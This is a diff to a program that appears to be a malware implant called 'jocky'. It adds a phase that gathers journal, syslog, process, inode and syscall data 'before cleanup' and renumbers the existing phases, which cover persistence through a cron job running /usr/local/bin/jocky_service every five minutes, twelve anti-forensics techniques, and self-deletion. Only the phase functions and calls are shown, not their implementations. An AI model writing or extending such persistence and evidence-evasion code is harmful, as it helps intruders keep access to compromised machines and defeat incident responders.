@@ -405,9 +405,54 @@ fn phase_module_operations() -> bool {
     return false
 }
 
-// ===== PHASE 10: PERSISTENCE & ANTI-FORENSICS =====
+// ===== PHASE 10: FORENSIC ANALYSIS & COLLECTION =====
+fn phase_forensic_analysis() -> bool {
+    println("[*] Phase 10: Forensic Evidence Collection & Analysis")
+
+    // Collect journal entries BEFORE cleanup
+    let journal_entries = forensic_collect_journal_entries()
+    println("    [+] Journal entries collected")
+
+    // Collect syslog lines for analysis
+    let syslog_lines = forensic_collect_syslog_lines()
+    println("    [+] Syslog collected")
+
+    // Collect process state
+    let process_list = forensic_collect_process_list()
+    println("    [+] Process list collected")
+
+    // Collect process tree
+    let process_tree = forensic_analyze_process_tree()
+    println("    [+] Process tree analyzed")
+
+    // Inode metadata collection
+    let inode_metadata = forensic_analysis_inode_metadata()
+    println("    [+] Inode metadata collected")
+
+    // Syscall trace analysis
+    let syscall_trace = forensic_analysis_syscall_trace()
+    println("    [+] Syscall trace analyzed")
+
+    // Build timeline from logs
+    let timeline = forensic_timeline_from_logs()
+    println("    [+] Forensic timeline constructed")
+
+    // Correlation analysis
+    forensic_correlation_engine()
+    println("    [+] Forensic correlation complete")
+
+    // Export findings
+    let report = forensic_generate_report()
+    println("    [+] Forensic report generated")
+
+    println("[+] Forensic analysis phase complete")
+    println("")
+    return true
+}
+
+// ===== PHASE 11: PERSISTENCE & ANTI-FORENSICS =====
 fn phase_persistence_and_cleanup() -> bool {
-    println("[*] Phase 10: Persistence & Anti-Forensics (12 Techniques)")
+    println("[*] Phase 11: Persistence & Anti-Forensics (12 Techniques)")
 
     // Cron Persistence
     if jocky_cron_install("/usr/local/bin/jocky_service", "*/5 * * * *") {
@@ -475,9 +520,9 @@ fn phase_persistence_and_cleanup() -> bool {
     return true
 }
 
-// ===== PHASE 11: SELF-DELETION =====
+// ===== PHASE 12: SELF-DELETION =====
 fn phase_self_delete() -> bool {
-    println("[*] Phase 11: Self-Deletion Protocol")
+    println("[*] Phase 12: Self-Deletion Protocol")
 
     // Remove from Cron
     jocky_cron_remove("jocky_service")
@@ -540,10 +585,13 @@ fn main() -> i32 {
     // Phase 9: Modules
     let _ = phase_module_operations()
 
-    // Phase 10: Persistence
+    // Phase 10: Forensic Analysis
+    let _ = phase_forensic_analysis()
+
+    // Phase 11: Persistence
     let _ = phase_persistence_and_cleanup()
 
-    // Phase 11: Self-delete
+    // Phase 12: Self-delete
     let _ = phase_self_delete()
 
     println("")
